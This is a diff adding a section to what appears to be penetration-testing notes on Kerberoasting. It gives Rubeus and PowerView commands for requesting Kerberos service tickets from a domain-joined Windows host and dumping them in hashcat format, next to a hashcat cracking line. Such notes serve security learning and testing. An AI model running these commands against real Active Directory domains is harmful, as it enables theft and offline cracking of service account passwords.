@@ -65,4 +65,33 @@ hashcat -m 13100 service-ticket.hash /usr/share/wordlists/rockyou.txt
 
 ![](../../kerberoasting_results_example.png)
 
+---
 
+## Requesting TGS from Windows 
+
+It is also possible to request Kerberos service tickets (TGS) directly from a domain‑joined Windows machine using an authenticated user session. 
+
+**Using Rubeus**
+```powershell
+.\Rubeus.exe kerberoast /nowrap
+```
+
+Automatically:
+
+- Finds accounts with SPNs
+    
+- Requests TGS tickets
+    
+- Prints hashes ready for cracking
+    
+
+Target a Specific SPN:
+
+```powershell
+Rubeus.exe kerberoast /spn:MSSQLSvc/server.domain.local
+```
+
+**Using Powerview**
+```powershell
+Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
+```
